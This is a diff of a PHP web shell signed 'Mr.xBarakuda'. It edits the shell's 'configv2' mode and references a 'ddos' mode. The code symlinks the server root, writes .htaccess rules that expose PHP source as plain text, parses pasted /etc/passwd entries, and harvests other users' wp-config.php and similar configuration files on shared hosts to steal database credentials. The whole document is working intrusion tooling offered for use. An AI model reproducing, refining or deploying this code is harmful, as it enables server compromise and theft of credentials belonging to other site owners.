@@ -6,8 +6,8 @@
 #--------Code by Mr.xBarakuda-------#
 #==================================*/
 session_start();
-@error_reporting(0);
-@set_time_limit(0);
+error_reporting(0);
+set_time_limit(0);
 @ini_set('error_log', NULL);
 @ini_set('log_errors', 0);
 @ini_set('output_buffering', 0);
@@ -1909,11 +1909,11 @@ elseif ($_GET['do'] == 'ddos') {
 elseif ($_GET['do'] == 'configv2') {
     if (strtolower(substr(PHP_OS, 0, 3)) == 'win') {
         echo '<script>alert("Tidak bisa di gunakan di server windows")</script>';
-        exit();
+        exit;
     }
 
     if ($_POST) {
-        if (isset($_POST['config']) && $_POST['config'] == 'symvhosts') {
+        if ($_POST['config'] == 'symvhosts') {
             @mkdir('kuda_symvhosts', 0777);
             exe('ln -s / kuda_symvhosts/root');
             $htaccess = "Options Indexes FollowSymLinks\nDirectoryIndex kuda.html\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any";
@@ -1941,28 +1941,28 @@ elseif ($_GET['do'] == 'configv2') {
             }
         }
 
-        if (isset($_POST['config']) && $_POST['config'] == 'symlink') {
+        if ($_POST['config'] == 'symlink') {
             @mkdir('kuda_symconfig', 0777);
             @symlink("/", "kuda_symconfig/root");
             $htaccess = "Options Indexes FollowSymLinks\nDirectoryIndex kuda.html\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any";
             @file_put_contents('kuda_symconfig/.htaccess', $htaccess);
         }
 
-        if (isset($_POST['config']) && $_POST['config'] == '404') {
+        if ($_POST['config'] == '404') {
             @mkdir('kuda_sym404', 0777);
             @symlink("/", "kuda_sym404/root");
             $htaccess = "Options Indexes FollowSymLinks\nDirectoryIndex kuda.html\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any\nIndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*\nIndexIgnore *.txt404\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} ^.*kuda_sym404 [NC]\nRewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
             @file_put_contents('kuda_sym404/.htaccess', $htaccess);
         }
 
-        if (isset($_POST['config']) && $_POST['config'] == 'grab') {
+        if ($_POST['config'] == 'grab') {
             mkdir('kuda_configgrab', 0777);
             $isi_htc = "Options all\nRequire None\nSatisfy Any";
             $htc = fopen('kuda_configgrab/.htaccess', 'w');
             fwrite($htc, $isi_htc);
             fclose($htc);
         }
-
+        $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
         $passwd = $_POST['passwd'];
         preg_match_all('/(.*?):x:/', $passwd, $user_config);
 
@@ -2443,7 +2443,7 @@ elseif ($_GET['do'] == 'configv2') {
                 "/home3/$user_kuda/public_html/Portal/wp-config.php" => "WordPressPortal");
 
             foreach ($grab_config as $config => $nama_config) {
-                if (isset($_POST['config']) && $_POST['config'] == 'grab') {
+                if ($_POST['config'] == 'grab') {
                     $ambil_config = @file_get_contents($config);
                     if ($ambil_config == '') {
                         // Do nothing if config is empty
@@ -2454,11 +2454,11 @@ elseif ($_GET['do'] == 'configv2') {
                     }
                 }
 
-                if (isset($_POST['config']) && $_POST['config'] == 'symlink') {
+                if ($_POST['config'] == 'symlink') {
                     @symlink($config, "kuda_symconfig/" . $user_kuda . "-" . $nama_config . ".txt");
                 }
 
-                if (isset($_POST['config']) && $_POST['config'] == '404') {
+                if ($_POST['config'] == '404') {
                     $sym404 = @symlink($config, "kuda_sym404/" . $user_kuda . "-" . $nama_config . ".txt");
                     if ($sym404) {
                         @mkdir("kuda_sym404/" . $user_kuda . "-" . $nama_config . ".txt404", 0777);
@@ -2469,20 +2469,20 @@ elseif ($_GET['do'] == 'configv2') {
                 }
             }
 
-            if (isset($_POST['config']) && $_POST['config'] == 'grab') {
-                echo "<center><a href='?dir=$dir/kuda_configgrab'><font color=lime>Done</font></a></center>";
+            if ($_POST['config'] == 'grab') {
+                echo "<center><a href='?dir=$dir/kuda_configgrab'><font color=lime>DONE</font></a></center>";
             }
 
-            if (isset($_POST['config']) && $_POST['config'] == '404') {
-                echo "<center><a href=\"kuda_sym404/root/\">SymlinkNya</a><br><a href=\"kuda_sym404/\">Configurations</a></center>";
+            if ($_POST['config'] == '404') {
+                echo "<center><a href='".$full."/kuda_sym404/root/'><font color='lime'>Symlinknya</font></a><br><a href='".$full."/kuda_sym404/' target='_blank'><font color='lime'>Configurations</font></a></center>";
             }
 
-            if (isset($_POST['config']) && $_POST['config'] == 'symlink') {
-                echo "<center><a href=\"kuda_symconfig/root/\">Symlinknya</a><br><a href=\"kuda_symconfig/\">Configurations</a></center>";
+            if ($_POST['config'] == 'symlink') {
+                echo "<center><a href='".$full."/kuda_symconfig/root/'><font color='lime'>Symlinknya</font></a><br><a href='".$full."/kuda_symconfig/' target='_blank'><font color='lime'>Configurations</font></a></center>";
             }
 
-            if (isset($_POST['config']) && $_POST['config'] == 'symvhost') {
-                echo "<center><a href=\"kuda_symvhost/root/\">Root Server</a><br><a href=\"kuda_symvhost/\">Configurations</a></center>";
+            if ($_POST['config'] == 'symvhost') {
+                echo "<center><a href='".$full."/kuda_symvhost/root/'>Symlink Vhost</font></a><br><a href='".$full."/kuda_symvhost/' target='_blank'><font color='lime'>Configurations</font></a></center>";
             }
         }
     } else {
